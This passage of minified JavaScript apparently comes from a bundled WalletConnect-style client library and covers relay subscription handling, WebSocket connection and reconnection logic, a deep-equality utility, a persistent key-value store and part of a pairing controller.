          , o = {
            method: Sp(t.protocol).batchFetchMessages,
            params: {
                topics: e.map(n => n.topic)
            }
        };
        this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "outgoing",
            request: o
        });
        let i;
        try {
            i = await await $c(new Promise( (n, s) => {
                this.relayer.request(o).catch(a => {
                    this.logger.warn(a),
                    s(a)
                }
                ).then(n)
            }
            ), this.subscribeTimeout, "rpcBatchFetchMessages failed, please try again")
        } catch {
            this.relayer.events.emit(Bn.connection_stalled)
        }
        return i
    }
    rpcUnsubscribe(e, t, o) {
        const i = {
            method: Sp(o.protocol).unsubscribe,
            params: {
                topic: e,
                id: t
            }
        };
        return this.logger.debug("Outgoing Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "outgoing",
            request: i
        }),
        this.relayer.request(i)
    }
    onSubscribe(e, t) {
        this.setSubscription(e, P2(mp({}, t), {
            id: e
        })),
        this.pending.delete(t.topic)
    }
    onBatchSubscribe(e) {
        e.length && e.forEach(t => {
            this.setSubscription(t.id, mp({}, t)),
            this.pending.delete(t.topic)
        }
        )
    }
    async onUnsubscribe(e, t, o) {
        this.events.removeAllListeners(t),
        this.hasSubscription(t, e) && this.deleteSubscription(t, o),
        await this.relayer.messages.del(e)
    }
    async setRelayerSubscriptions(e) {
        await this.relayer.core.storage.setItem(this.storageKey, e)
    }
    async getRelayerSubscriptions() {
        return await this.relayer.core.storage.getItem(this.storageKey)
    }
    setSubscription(e, t) {
        this.logger.debug("Setting subscription"),
        this.logger.trace({
            type: "method",
            method: "setSubscription",
            id: e,
            subscription: t
        }),
        this.addSubscription(e, t)
    }
    addSubscription(e, t) {
        this.subscriptions.set(e, mp({}, t)),
        this.topicMap.set(t.topic, e),
        this.events.emit(ti.created, t)
    }
    getSubscription(e) {
        this.logger.debug("Getting subscription"),
        this.logger.trace({
            type: "method",
            method: "getSubscription",
            id: e
        });
        const t = this.subscriptions.get(e);
        if (!t) {
            const {message: o} = Xe("NO_MATCHING_KEY", `${this.name}: ${e}`);
            throw new Error(o)
        }
        return t
    }
    deleteSubscription(e, t) {
        this.logger.debug("Deleting subscription"),
        this.logger.trace({
            type: "method",
            method: "deleteSubscription",
            id: e,
            reason: t
        });
        const o = this.getSubscription(e);
        this.subscriptions.delete(e),
        this.topicMap.delete(o.topic, e),
        this.events.emit(ti.deleted, P2(mp({}, o), {
            reason: t
        }))
    }
    async persist() {
        await this.setRelayerSubscriptions(this.values),
        this.events.emit(ti.sync)
    }
    async onRestart() {
        if (this.cached.length) {
            const e = [...this.cached]
              , t = Math.ceil(this.cached.length / this.batchSubscribeTopicsLimit);
            for (let o = 0; o < t; o++) {
                const i = e.splice(0, this.batchSubscribeTopicsLimit);
                await this.batchSubscribe(i)
            }
        }
        this.events.emit(ti.resubscribed)
    }
    async restore() {
        try {
            const e = await this.getRelayerSubscriptions();
            if (typeof e > "u" || !e.length)
                return;
            if (this.subscriptions.size) {
                const {message: t} = Xe("RESTORE_WILL_OVERRIDE", this.name);
                throw this.logger.error(t),
                this.logger.error(`${this.name}: ${JSON.stringify(this.values)}`),
                new Error(t)
            }
            this.cached = e,
            this.logger.debug(`Successfully Restored subscriptions for ${this.name}`),
            this.logger.trace({
                type: "method",
                method: "restore",
                subscriptions: this.values
            })
        } catch (e) {
            this.logger.debug(`Failed to Restore subscriptions for ${this.name}`),
            this.logger.error(e)
        }
    }
    async batchSubscribe(e) {
        e.length && (await this.rpcBatchSubscribe(e),
        this.onBatchSubscribe(await Promise.all(e.map(async t => P2(mp({}, t), {
            id: await this.getSubscriptionId(t.topic)
        })))))
    }
    async batchFetchMessages(e) {
        if (!e.length)
            return;
        this.logger.trace(`Fetching batch messages for ${e.length} subscriptions`);
        const t = await this.rpcBatchFetchMessages(e);
        t && t.messages && (await Bee(Ze.toMiliseconds(Ze.ONE_SECOND)),
        await this.relayer.handleBatchMessageEvents(t.messages))
    }
    async onConnect() {
        await this.restart(),
        this.reset()
    }
    onDisconnect() {
        this.onDisable()
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
    async restartToComplete(e) {
        !this.relayer.connected && !this.relayer.connecting && (this.cached.push(e),
        await this.relayer.transportOpen())
    }
    async getClientId() {
        return this.clientId || (this.clientId = await this.relayer.core.crypto.getClientId()),
        this.clientId
    }
    async getSubscriptionId(e) {
        return js(e + await this.getClientId())
    }
}
var Kse = Object.defineProperty
  , F_ = Object.getOwnPropertySymbols
  , Zse = Object.prototype.hasOwnProperty
  , Yse = Object.prototype.propertyIsEnumerable
  , nA = (r, e, t) => e in r ? Kse(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , U_ = (r, e) => {
    for (var t in e || (e = {}))
        Zse.call(e, t) && nA(r, t, e[t]);
    if (F_)
        for (var t of F_(e))
            Yse.call(e, t) && nA(r, t, e[t]);
    return r
}
  , gr = (r, e, t) => nA(r, typeof e != "symbol" ? e + "" : e, t);
let Xse = class extends XK {
    constructor(e) {
        super(e),
        gr(this, "protocol", "wc"),
        gr(this, "version", 2),
        gr(this, "core"),
        gr(this, "logger"),
        gr(this, "events", new fs.EventEmitter),
        gr(this, "provider"),
        gr(this, "messages"),
        gr(this, "subscriber"),
        gr(this, "publisher"),
        gr(this, "name", Soe),
        gr(this, "transportExplicitlyClosed", !1),
        gr(this, "initialized", !1),
        gr(this, "connectionAttemptInProgress", !1),
        gr(this, "relayUrl"),
        gr(this, "projectId"),
        gr(this, "packageName"),
        gr(this, "bundleId"),
        gr(this, "hasExperiencedNetworkDisruption", !1),
        gr(this, "pingTimeout"),
        gr(this, "heartBeatTimeout", Ze.toMiliseconds(Ze.THIRTY_SECONDS + Ze.FIVE_SECONDS)),
        gr(this, "reconnectTimeout"),
        gr(this, "connectPromise"),
        gr(this, "reconnectInProgress", !1),
        gr(this, "requestsInFlight", []),
        gr(this, "connectTimeout", Ze.toMiliseconds(Ze.ONE_SECOND * 15)),
        gr(this, "request", async t => {
            var o, i;
            this.logger.debug("Publishing Request Payload");
            const n = t.id || zl().toString();
            await this.toEstablishConnection();
            try {
                this.logger.trace({
                    id: n,
                    method: t.method,
                    topic: (o = t.params) == null ? void 0 : o.topic
                }, "relayer.request - publishing...");
                const s = `${n}:${((i = t.params) == null ? void 0 : i.tag) || ""}`;
                this.requestsInFlight.push(s);
                const a = await this.provider.request(t);
                return this.requestsInFlight = this.requestsInFlight.filter(l => l !== s),
                a
            } catch (s) {
                throw this.logger.debug(`Failed to Publish Request: ${n}`),
                s
            }
        }
        ),
        gr(this, "resetPingTimeout", () => {
            n1() && (clearTimeout(this.pingTimeout),
            this.pingTimeout = setTimeout( () => {
                var t, o, i, n;
                try {
                    this.logger.debug({}, "pingTimeout: Connection stalled, terminating..."),
                    (n = (i = (o = (t = this.provider) == null ? void 0 : t.connection) == null ? void 0 : o.socket) == null ? void 0 : i.terminate) == null || n.call(i)
                } catch (s) {
                    this.logger.warn(s, s == null ? void 0 : s.message)
                }
            }
            , this.heartBeatTimeout))
        }
        ),
        gr(this, "onPayloadHandler", t => {
            this.onProviderPayload(t),
            this.resetPingTimeout()
        }
        ),
        gr(this, "onConnectHandler", () => {
            this.logger.warn({}, "Relayer connected "),
            this.startPingTimeout(),
            this.events.emit(Bn.connect)
        }
        ),
        gr(this, "onDisconnectHandler", () => {
            this.logger.warn({}, "Relayer disconnected "),
            this.requestsInFlight = [],
            this.onProviderDisconnect()
        }
        ),
        gr(this, "onProviderErrorHandler", t => {
            this.logger.fatal(`Fatal socket error: ${t.message}`),
            this.events.emit(Bn.error, t),
            this.logger.fatal("Fatal socket error received, closing transport"),
            this.transportClose()
        }
        ),
        gr(this, "registerProviderListeners", () => {
            this.provider.on(vi.payload, this.onPayloadHandler),
            this.provider.on(vi.connect, this.onConnectHandler),
            this.provider.on(vi.disconnect, this.onDisconnectHandler),
            this.provider.on(vi.error, this.onProviderErrorHandler)
        }
        ),
        this.core = e.core,
        this.logger = typeof e.logger < "u" && typeof e.logger != "string" ? xo(e.logger, this.name) : S1(m3({
            level: e.logger || Coe
        })),
        this.messages = new Rse(this.logger,e.core),
        this.subscriber = new Gse(this,this.logger),
        this.publisher = new Use(this,this.logger),
        this.relayUrl = (e == null ? void 0 : e.relayUrl) || uD,
        this.projectId = e.projectId,
        dee() ? this.packageName = _B() : hee() && (this.bundleId = _B()),
        this.provider = {}
    }
    async init() {
        if (this.logger.trace("Initialized"),
        this.registerEventListeners(),
        await Promise.all([this.messages.init(), this.subscriber.init()]),
        this.initialized = !0,
        this.subscriber.hasAnyTopics)
            try {
                await this.transportOpen()
            } catch (e) {
                this.logger.warn(e, e == null ? void 0 : e.message)
            }
    }
    get context() {
        return zo(this.logger)
    }
    get connected() {
        var e, t, o;
        return ((o = (t = (e = this.provider) == null ? void 0 : e.connection) == null ? void 0 : t.socket) == null ? void 0 : o.readyState) === 1 || !1
    }
    get connecting() {
        var e, t, o;
        return ((o = (t = (e = this.provider) == null ? void 0 : e.connection) == null ? void 0 : t.socket) == null ? void 0 : o.readyState) === 0 || this.connectPromise !== void 0 || !1
    }
    async publish(e, t, o) {
        this.isInitialized(),
        await this.publisher.publish(e, t, o),
        await this.recordMessageEvent({
            topic: e,
            message: t,
            publishedAt: Date.now(),
            transportType: kr.relay
        }, Am.outbound)
    }
    async subscribe(e, t) {
        var o, i, n;
        this.isInitialized(),
        (!(t != null && t.transportType) || (t == null ? void 0 : t.transportType) === "relay") && await this.toEstablishConnection();
        const s = typeof ((o = t == null ? void 0 : t.internal) == null ? void 0 : o.throwOnFailedPublish) > "u" ? !0 : (i = t == null ? void 0 : t.internal) == null ? void 0 : i.throwOnFailedPublish;
        let a = ((n = this.subscriber.topicMap.get(e)) == null ? void 0 : n[0]) || "", l;
        const f = h => {
            h.topic === e && (this.subscriber.off(ti.created, f),
            l())
        }
        ;
        return await Promise.all([new Promise(h => {
            l = h,
            this.subscriber.on(ti.created, f)
        }
        ), new Promise(async (h, p) => {
            a = await this.subscriber.subscribe(e, U_({
                internal: {
                    throwOnFailedPublish: s
                }
            }, t)).catch(b => {
                s && p(b)
            }
            ) || a,
            h()
        }
        )]),
        a
    }
    async unsubscribe(e, t) {
        this.isInitialized(),
        await this.subscriber.unsubscribe(e, t)
    }
    on(e, t) {
        this.events.on(e, t)
    }
    once(e, t) {
        this.events.once(e, t)
    }
    off(e, t) {
        this.events.off(e, t)
    }
    removeListener(e, t) {
        this.events.removeListener(e, t)
    }
    async transportDisconnect() {
        this.provider.disconnect && (this.hasExperiencedNetworkDisruption || this.connected) ? await $c(this.provider.disconnect(), 2e3, "provider.disconnect()").catch( () => this.onProviderDisconnect()) : this.onProviderDisconnect()
    }
    async transportClose() {
        this.transportExplicitlyClosed = !0,
        await this.transportDisconnect()
    }
    async transportOpen(e) {
        if (!this.subscriber.hasAnyTopics) {
            this.logger.warn("Starting WS connection skipped because the client has no topics to work with.");
            return
        }
        if (this.connectPromise ? (this.logger.debug({}, "Waiting for existing connection attempt to resolve..."),
        await this.connectPromise,
        this.logger.debug({}, "Existing connection attempt resolved")) : (this.connectPromise = new Promise(async (t, o) => {
            await this.connect(e).then(t).catch(o).finally( () => {
                this.connectPromise = void 0
            }
            )
        }
        ),
        await this.connectPromise),
        !this.connected)
            throw new Error(`Couldn't establish socket connection to the relay server: ${this.relayUrl}`)
    }
    async restartTransport(e) {
        this.logger.debug({}, "Restarting transport..."),
        !this.connectionAttemptInProgress && (this.relayUrl = e || this.relayUrl,
        await this.confirmOnlineStateOrThrow(),
        await this.transportClose(),
        await this.transportOpen())
    }
    async confirmOnlineStateOrThrow() {
        if (!await b_())
            throw new Error("No internet connection detected. Please restart your network and try again.")
    }
    async handleBatchMessageEvents(e) {
        if ((e == null ? void 0 : e.length) === 0) {
            this.logger.trace("Batch message events is empty. Ignoring...");
            return
        }
        const t = e.sort( (o, i) => o.publishedAt - i.publishedAt);
        this.logger.debug(`Batch of ${t.length} message events sorted`);
        for (const o of t)
            try {
                await this.onMessageEvent(o)
            } catch (i) {
                this.logger.warn(i, "Error while processing batch message event: " + (i == null ? void 0 : i.message))
            }
        this.logger.trace(`Batch of ${t.length} message events processed`)
    }
    async onLinkMessageEvent(e, t) {
        const {topic: o} = e;
        if (!t.sessionExists) {
            const i = yn(Ze.FIVE_MINUTES)
              , n = {
                topic: o,
                expiry: i,
                relay: {
                    protocol: "irn"
                },
                active: !1
            };
            await this.core.pairing.pairings.set(o, n)
        }
        this.events.emit(Bn.message, e),
        await this.recordMessageEvent(e, Am.inbound)
    }
    async connect(e) {
        await this.confirmOnlineStateOrThrow(),
        e && e !== this.relayUrl && (this.relayUrl = e,
        await this.transportDisconnect()),
        this.connectionAttemptInProgress = !0,
        this.transportExplicitlyClosed = !1;
        let t = 1;
        for (; t < 6; ) {
            try {
                if (this.transportExplicitlyClosed)
                    break;
                this.logger.debug({}, `Connecting to ${this.relayUrl}, attempt: ${t}...`),
                await this.createProvider(),
                await new Promise(async (o, i) => {
                    const n = () => {
                        i(new Error("Connection interrupted while trying to subscribe"))
                    }
                    ;
                    this.provider.once(vi.disconnect, n),
                    await $c(new Promise( (s, a) => {
                        this.provider.connect().then(s).catch(a)
                    }
                    ), this.connectTimeout, `Socket stalled when trying to connect to ${this.relayUrl}`).catch(s => {
                        i(s)
                    }
                    ).finally( () => {
                        this.provider.off(vi.disconnect, n),
                        clearTimeout(this.reconnectTimeout)
                    }
                    ),
                    await new Promise(async (s, a) => {
                        const l = () => {
                            a(new Error("Connection interrupted while trying to subscribe"))
                        }
                        ;
                        this.provider.once(vi.disconnect, l),
                        await this.subscriber.start().then(s).catch(a).finally( () => {
                            this.provider.off(vi.disconnect, l)
                        }
                        )
                    }
                    ),
                    this.hasExperiencedNetworkDisruption = !1,
                    o()
                }
                )
            } catch (o) {
                await this.subscriber.stop();
                const i = o;
                this.logger.warn({}, i.message),
                this.hasExperiencedNetworkDisruption = !0
            } finally {
                this.connectionAttemptInProgress = !1
            }
            if (this.connected) {
                this.logger.debug({}, `Connected to ${this.relayUrl} successfully on attempt: ${t}`);
                break
            }
            await new Promise(o => setTimeout(o, Ze.toMiliseconds(t * 1))),
            t++
        }
    }
    startPingTimeout() {
        var e, t, o, i, n;
        if (n1())
            try {
                (t = (e = this.provider) == null ? void 0 : e.connection) != null && t.socket && ((n = (i = (o = this.provider) == null ? void 0 : o.connection) == null ? void 0 : i.socket) == null || n.on("ping", () => {
                    this.resetPingTimeout()
                }
                )),
                this.resetPingTimeout()
            } catch (s) {
                this.logger.warn(s, s == null ? void 0 : s.message)
            }
    }
    async createProvider() {
        this.provider.connection && this.unregisterProviderListeners();
        const e = await this.core.crypto.signJWT(this.relayUrl);
        this.provider = new foe(new goe(mee({
            sdkVersion: XE,
            protocol: this.protocol,
            version: this.version,
            relayUrl: this.relayUrl,
            projectId: this.projectId,
            auth: e,
            useOnCloseEvent: !0,
            bundleId: this.bundleId,
            packageName: this.packageName
        }))),
        this.registerProviderListeners()
    }
    async recordMessageEvent(e, t) {
        const {topic: o, message: i} = e;
        await this.messages.set(o, i, t)
    }
    async shouldIgnoreMessageEvent(e) {
        const {topic: t, message: o} = e;
        if (!o || o.length === 0)
            return this.logger.warn(`Ignoring invalid/empty message: ${o}`),
            !0;
        if (!await this.subscriber.isKnownTopic(t))
            return this.logger.warn(`Ignoring message for unknown topic ${t}`),
            !0;
        const i = this.messages.has(t, o);
        return i && this.logger.warn(`Ignoring duplicate message: ${o}`),
        i
    }
    async onProviderPayload(e) {
        if (this.logger.debug("Incoming Relay Payload"),
        this.logger.trace({
            type: "payload",
            direction: "incoming",
            payload: e
        }),
        F3(e)) {
            if (!e.method.endsWith(Boe))
                return;
            const t = e.params
              , {topic: o, message: i, publishedAt: n, attestation: s} = t.data
              , a = {
                topic: o,
                message: i,
                publishedAt: n,
                transportType: kr.relay,
                attestation: s
            };
            this.logger.debug("Emitting Relayer Payload"),
            this.logger.trace(U_({
                type: "event",
                event: t.id
            }, a)),
            this.events.emit(t.id, a),
            await this.acknowledgePayload(e),
            await this.onMessageEvent(a)
        } else
            U1(e) && this.events.emit(Bn.message_ack, e)
    }
    async onMessageEvent(e) {
        await this.shouldIgnoreMessageEvent(e) || (await this.recordMessageEvent(e, Am.inbound),
        this.events.emit(Bn.message, e))
    }
    async acknowledgePayload(e) {
        const t = N3(e.id, !0);
        await this.provider.connection.send(t)
    }
    unregisterProviderListeners() {
        this.provider.off(vi.payload, this.onPayloadHandler),
        this.provider.off(vi.connect, this.onConnectHandler),
        this.provider.off(vi.disconnect, this.onDisconnectHandler),
        this.provider.off(vi.error, this.onProviderErrorHandler),
        clearTimeout(this.pingTimeout)
    }
    async registerEventListeners() {
        let e = await b_();
        $ne(async t => {
            e !== t && (e = t,
            t ? await this.transportOpen().catch(o => this.logger.error(o, o == null ? void 0 : o.message)) : (this.hasExperiencedNetworkDisruption = !0,
            await this.transportDisconnect(),
            this.transportExplicitlyClosed = !1))
        }
        ),
        this.core.heartbeat.on(Su.pulse, async () => {
            if (!this.transportExplicitlyClosed && !this.connected && qne())
                try {
                    await this.confirmOnlineStateOrThrow(),
                    await this.transportOpen()
                } catch (t) {
                    this.logger.warn(t, t == null ? void 0 : t.message)
                }
        }
        )
    }
    async onProviderDisconnect() {
        clearTimeout(this.pingTimeout),
        this.events.emit(Bn.disconnect),
        this.connectionAttemptInProgress = !1,
        !this.reconnectInProgress && (this.reconnectInProgress = !0,
        await this.subscriber.stop(),
        this.subscriber.hasAnyTopics && (this.transportExplicitlyClosed || (this.reconnectTimeout = setTimeout(async () => {
            await this.transportOpen().catch(e => this.logger.error(e, e == null ? void 0 : e.message)),
            this.reconnectTimeout = void 0,
            this.reconnectInProgress = !1
        }
        , Ze.toMiliseconds(_oe)))))
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
    async toEstablishConnection() {
        if (await this.confirmOnlineStateOrThrow(),
        !this.connected) {
            if (this.connectPromise) {
                await this.connectPromise;
                return
            }
            await this.connect()
        }
    }
}
;
function Jse() {}
function k_(r) {
    if (!r || typeof r != "object")
        return !1;
    const e = Object.getPrototypeOf(r);
    return e === null || e === Object.prototype || Object.getPrototypeOf(e) === null ? Object.prototype.toString.call(r) === "[object Object]" : !1
}
function L_(r) {
    return Object.getOwnPropertySymbols(r).filter(e => Object.prototype.propertyIsEnumerable.call(r, e))
}
function $_(r) {
    return r == null ? r === void 0 ? "[object Undefined]" : "[object Null]" : Object.prototype.toString.call(r)
}
const Qse = "[object RegExp]"
  , eae = "[object String]"
  , tae = "[object Number]"
  , rae = "[object Boolean]"
  , z_ = "[object Arguments]"
  , nae = "[object Symbol]"
  , oae = "[object Date]"
  , iae = "[object Map]"
  , sae = "[object Set]"
  , aae = "[object Array]"
  , cae = "[object Function]"
  , lae = "[object ArrayBuffer]"
  , C2 = "[object Object]"
  , uae = "[object Error]"
  , fae = "[object DataView]"
  , dae = "[object Uint8Array]"
  , hae = "[object Uint8ClampedArray]"
  , pae = "[object Uint16Array]"
  , gae = "[object Uint32Array]"
  , yae = "[object BigUint64Array]"
  , bae = "[object Int8Array]"
  , mae = "[object Int16Array]"
  , xae = "[object Int32Array]"
  , wae = "[object BigInt64Array]"
  , vae = "[object Float32Array]"
  , Tae = "[object Float64Array]";
function Eae(r, e) {
    return r === e || Number.isNaN(r) && Number.isNaN(e)
}
function Aae(r, e, t) {
    return Bp(r, e, void 0, void 0, void 0, void 0, t)
}
function Bp(r, e, t, o, i, n, s) {
    const a = s(r, e, t, o, i, n);
    if (a !== void 0)
        return a;
    if (typeof r == typeof e)
        switch (typeof r) {
        case "bigint":
        case "string":
        case "boolean":
        case "symbol":
        case "undefined":
            return r === e;
        case "number":
            return r === e || Object.is(r, e);
        case "function":
            return r === e;
        case "object":
            return Dp(r, e, n, s)
        }
    return Dp(r, e, n, s)
}
function Dp(r, e, t, o) {
    if (Object.is(r, e))
        return !0;
    let i = $_(r)
      , n = $_(e);
    if (i === z_ && (i = C2),
    n === z_ && (n = C2),
    i !== n)
        return !1;
    switch (i) {
    case eae:
        return r.toString() === e.toString();
    case tae:
        {
            const l = r.valueOf()
              , f = e.valueOf();
            return Eae(l, f)
        }
    case rae:
    case oae:
    case nae:
        return Object.is(r.valueOf(), e.valueOf());
    case Qse:
        return r.source === e.source && r.flags === e.flags;
    case cae:
        return r === e
    }
    t = t ?? new Map;
    const s = t.get(r)
      , a = t.get(e);
    if (s != null && a != null)
        return s === e;
    t.set(r, e),
    t.set(e, r);
    try {
        switch (i) {
        case iae:
            {
                if (r.size !== e.size)
                    return !1;
                for (const [l,f] of r.entries())
                    if (!e.has(l) || !Bp(f, e.get(l), l, r, e, t, o))
                        return !1;
                return !0
            }
        case sae:
            {
                if (r.size !== e.size)
                    return !1;
                const l = Array.from(r.values())
                  , f = Array.from(e.values());
                for (let h = 0; h < l.length; h++) {
                    const p = l[h]
                      , b = f.findIndex(v => Bp(p, v, void 0, r, e, t, o));
                    if (b === -1)
                        return !1;
                    f.splice(b, 1)
                }
                return !0
            }
        case aae:
        case dae:
        case hae:
        case pae:
        case gae:
        case yae:
        case bae:
        case mae:
        case xae:
        case wae:
        case vae:
        case Tae:
            {
                if (typeof Buffer < "u" && Buffer.isBuffer(r) !== Buffer.isBuffer(e) || r.length !== e.length)
                    return !1;
                for (let l = 0; l < r.length; l++)
                    if (!Bp(r[l], e[l], l, r, e, t, o))
                        return !1;
                return !0
            }
        case lae:
            return r.byteLength !== e.byteLength ? !1 : Dp(new Uint8Array(r), new Uint8Array(e), t, o);
        case fae:
            return r.byteLength !== e.byteLength || r.byteOffset !== e.byteOffset ? !1 : Dp(new Uint8Array(r), new Uint8Array(e), t, o);
        case uae:
            return r.name === e.name && r.message === e.message;
        case C2:
            {
                if (!(Dp(r.constructor, e.constructor, t, o) || k_(r) && k_(e)))
                    return !1;
                const l = [...Object.keys(r), ...L_(r)]
                  , f = [...Object.keys(e), ...L_(e)];
                if (l.length !== f.length)
                    return !1;
                for (let h = 0; h < l.length; h++) {
                    const p = l[h]
                      , b = r[p];
                    if (!Object.hasOwn(e, p))
                        return !1;
                    const v = e[p];
                    if (!Bp(b, v, p, r, e, t, o))
                        return !1
                }
                return !0
            }
        default:
            return !1
        }
    } finally {
        t.delete(r),
        t.delete(e)
    }
}
function Pae(r, e) {
    return Aae(r, e, Jse)
}
var Cae = Object.defineProperty
  , j_ = Object.getOwnPropertySymbols
  , Sae = Object.prototype.hasOwnProperty
  , Bae = Object.prototype.propertyIsEnumerable
  , oA = (r, e, t) => e in r ? Cae(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , q_ = (r, e) => {
    for (var t in e || (e = {}))
        Sae.call(e, t) && oA(r, t, e[t]);
    if (j_)
        for (var t of j_(e))
            Bae.call(e, t) && oA(r, t, e[t]);
    return r
}
  , So = (r, e, t) => oA(r, typeof e != "symbol" ? e + "" : e, t);
class _u extends JK {
    constructor(e, t, o, i=Zs, n=void 0) {
        super(e, t, o, i),
        this.core = e,
        this.logger = t,
        this.name = o,
        So(this, "map", new Map),
        So(this, "version", Ioe),
        So(this, "cached", []),
        So(this, "initialized", !1),
        So(this, "getKey"),
        So(this, "storagePrefix", Zs),
        So(this, "recentlyDeleted", []),
        So(this, "recentlyDeletedLimit", 200),
        So(this, "init", async () => {
            this.initialized || (this.logger.trace("Initialized"),
            await this.restore(),
            this.cached.forEach(s => {
                this.getKey && s !== null && !zn(s) ? this.map.set(this.getKey(s), s) : mne(s) ? this.map.set(s.id, s) : xne(s) && this.map.set(s.topic, s)
            }
            ),
            this.cached = [],
            this.initialized = !0)
        }
        ),
        So(this, "set", async (s, a) => {
            this.isInitialized(),
            this.map.has(s) ? await this.update(s, a) : (this.logger.debug("Setting value"),
            this.logger.trace({
                type: "method",
                method: "set",
                key: s,
                value: a
            }),
            this.map.set(s, a),
            await this.persist())
        }
        ),
        So(this, "get", s => (this.isInitialized(),
        this.logger.debug("Getting value"),
        this.logger.trace({
            type: "method",
            method: "get",
            key: s
        }),
        this.getData(s))),
        So(this, "getAll", s => (this.isInitialized(),
        s ? this.values.filter(a => Object.keys(s).every(l => Pae(a[l], s[l]))) : this.values)),
        So(this, "update", async (s, a) => {
            this.isInitialized(),
            this.logger.debug("Updating value"),
            this.logger.trace({
                type: "method",
                method: "update",
                key: s,
                update: a
            });
            const l = q_(q_({}, this.getData(s)), a);
            this.map.set(s, l),
            await this.persist()
        }
        ),
        So(this, "delete", async (s, a) => {
            this.isInitialized(),
            this.map.has(s) && (this.logger.debug("Deleting value"),
            this.logger.trace({
                type: "method",
                method: "delete",
                key: s,
                reason: a
            }),
            this.map.delete(s),
            this.addToRecentlyDeleted(s),
            await this.persist())
        }
        ),
        this.logger = xo(t, this.name),
        this.storagePrefix = i,
        this.getKey = n
    }
    get context() {
        return zo(this.logger)
    }
    get storageKey() {
        return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
    }
    get length() {
        return this.map.size
    }
    get keys() {
        return Array.from(this.map.keys())
    }
    get values() {
        return Array.from(this.map.values())
    }
    addToRecentlyDeleted(e) {
        this.recentlyDeleted.push(e),
        this.recentlyDeleted.length >= this.recentlyDeletedLimit && this.recentlyDeleted.splice(0, this.recentlyDeletedLimit / 2)
    }
    async setDataStore(e) {
        await this.core.storage.setItem(this.storageKey, e)
    }
    async getDataStore() {
        return await this.core.storage.getItem(this.storageKey)
    }
    getData(e) {
        const t = this.map.get(e);
        if (!t) {
            if (this.recentlyDeleted.includes(e)) {
                const {message: i} = Xe("MISSING_OR_INVALID", `Record was recently deleted - ${this.name}: ${e}`);
                throw this.logger.error(i),
                new Error(i)
            }
            const {message: o} = Xe("NO_MATCHING_KEY", `${this.name}: ${e}`);
            throw this.logger.error(o),
            new Error(o)
        }
        return t
    }
    async persist() {
        await this.setDataStore(this.values)
    }
    async restore() {
        try {
            const e = await this.getDataStore();
            if (typeof e > "u" || !e.length)
                return;
            if (this.map.size) {
                const {message: t} = Xe("RESTORE_WILL_OVERRIDE", this.name);
                throw this.logger.error(t),
                new Error(t)
            }
            this.cached = e,
            this.logger.debug(`Successfully Restored value for ${this.name}`),
            this.logger.trace({
                type: "method",
                method: "restore",
                value: this.values
            })
        } catch (e) {
            this.logger.debug(`Failed to Restore value for ${this.name}`),
            this.logger.error(e)
        }
    }
    isInitialized() {
        if (!this.initialized) {
            const {message: e} = Xe("NOT_INITIALIZED", this.name);
            throw new Error(e)
        }
    }
}
var _ae = Object.defineProperty
  , Iae = (r, e, t) => e in r ? _ae(r, e, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: t
}) : r[e] = t
  , sr = (r, e, t) => Iae(r, typeof e != "symbol" ? e + "" : e, t);
class Oae {
    constructor(e, t) {
        this.core = e,
        this.logger = t,
        sr(this, "name", Moe),
        sr(this, "version", Noe),
        sr(this, "events", new bM),
        sr(this, "pairings"),
        sr(this, "initialized", !1),
        sr(this, "storagePrefix", Zs),
        sr(this, "ignoredPayloadTypes", [ja]),
        sr(this, "registeredMethods", []),
        sr(this, "init", async () => {
            this.initialized || (await this.pairings.init(),
            await this.cleanup(),
            this.registerRelayerEvents(),
            this.registerExpirerEvents(),
            this.initialized = !0,
            this.logger.trace("Initialized"))
        }
        ),
        sr(this, "register", ({methods: o}) => {
            this.isInitialized(),
            this.registeredMethods = [...new Set([...this.registeredMethods, ...o])]
        }
        ),
        sr(this, "create", async o => {
            this.isInitialized();
            const i = ZE()
              , n = await this.core.crypto.setSymKey(i)
              , s = yn(Ze.FIVE_MINUTES)
              , a = {
                protocol: lD
            }
              , l = {
                topic: n,
                expiry: s,
                relay: a,
                active: !1,
                methods: o == null ? void 0 : o.methods
            }
              , f = c_({
                protocol: this.core.protocol,
                version: this.core.version,
                topic: n,
                symKey: i,
                relay: a,
                expiryTimestamp: s,
                methods: o == null ? void 0 : o.methods
            });
            return this.events.emit(Nl.create, l),
            this.core.expirer.set(n, s),
            await this.pairings.set(n, l),
            await this.core.relayer.subscribe(n, {
                transportType: o == null ? void 0 : o.transportType
            }),
            {
                topic: n,
                uri: f
            }
        }
        ),
        sr(this, "pair", async o => {
            this.isInitialized();
            const i = this.core.eventClient.createEvent({
                properties: {
                    topic: o == null ? void 0 : o.uri,
                    trace: [Ws.pairing_started]
                }
            });
            this.isValidPair(o, i);
            const {topic: n, symKey: s, relay: a, expiryTimestamp: l, methods: f} = a_(o.uri);
            i.props.properties.topic = n,
            i.addTrace(Ws.pairing_uri_validation_success),
            i.addTrace(Ws.pairing_uri_not_expired);
            let h;
            if (this.pairings.keys.includes(n)) {
                if (h = this.pairings.get(n),
                i.addTrace(Ws.existing_pairing),
                h.active)
                    throw i.setError(Aa.active_pairing_already_exists),
                    new Error(`Pairing already exists: ${n}. Please try again with a new connection URI.`);
                i.addTrace(Ws.pairing_not_expired)
            }
            const p = l || yn(Ze.FIVE_MINUTES)
              , b = {
                topic: n,
                relay: a,
                expiry: p,
                active: !1,
                methods: f
            };
            this.core.expirer.set(n, p),
            await this.pairings.set(n, b),
            i.addTrace(Ws.store_new_pairing),
            o.activatePairing && await this.activate({
                topic: n
            }),
            this.events.emit(Nl.create, b),
            i.addTrace(Ws.emit_inactive_pairing),
            this.core.crypto.keychain.has(n) || await this.core.crypto.setSymKey(s, n),
            i.addTrace(Ws.subscribing_pairing_topic);
            try {
                await this.core.relayer.confirmOnlineStateOrThrow()
            } catch {
                i.setError(Aa.no_internet_connection)
            }
            try {
                await this.core.relayer.subscribe(n, {
                    relay: a
                })
            } catch (v) {
